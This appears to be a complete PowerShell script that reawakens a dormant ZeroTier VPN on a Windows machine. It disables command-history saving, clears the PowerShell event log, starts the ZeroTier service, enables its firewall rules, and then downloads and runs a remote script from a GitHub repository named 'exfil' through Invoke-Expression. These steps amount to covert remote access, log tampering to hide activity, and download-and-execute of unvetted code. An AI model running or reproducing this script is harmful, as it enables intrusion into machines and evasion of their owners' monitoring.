<# zerotier activator from dormancy. #>
# variables
$AvailableTls = [enum]::GetValues('Net.SecurityProtocolType') | Where-Object { $_ -ge 'Tls12' }
foreach ($tlsProtocol in $AvailableTls) {[Net.ServicePointManager]::SecurityProtocol = [Net.ServicePointManager]::SecurityProtocol -bor $tlsProtocol}
Set-PSReadLineOption -HistorySaveStyle SaveNothing | Out-Null
Clear-EventLog "Windows Powershell"
$LogEngineLifecycleEvent = $false | Out-Null
[void]$LogEngineLifecycleEvent
$ztnethandler = "https://raw.githubusercontent.com/sempiampi/exfil/refs/heads/main/ZeroTierStuff/ZtNetJoinLeaveHandler.ps1"
$serviceset = @("ZeroTierOneService")
$ruleset = @("ZeroTier One", "ZeroTier x64 Binary In", "ZeroTier UDP/9993 In")

# enabling services
foreach ($service in $serviceset) {
    $serviceObject = Get-Service -Name $service
    if ($serviceObject) {
        if ($serviceObject.Status -eq 'Stopped') {
            Start-Service -Name $service
        }
        Set-Service -Name $service -StartupType Automatic
    } else {
    }
}

# enabling firewall rules.
foreach ($rule in $ruleset) {
    netsh advfirewall firewall set rule name="$rule" new enable=yes *> $null
}

# rejoining the zt network.
Invoke-Expression (Invoke-WebRequest -Uri $ztnethandler -UseBasicParsing).Content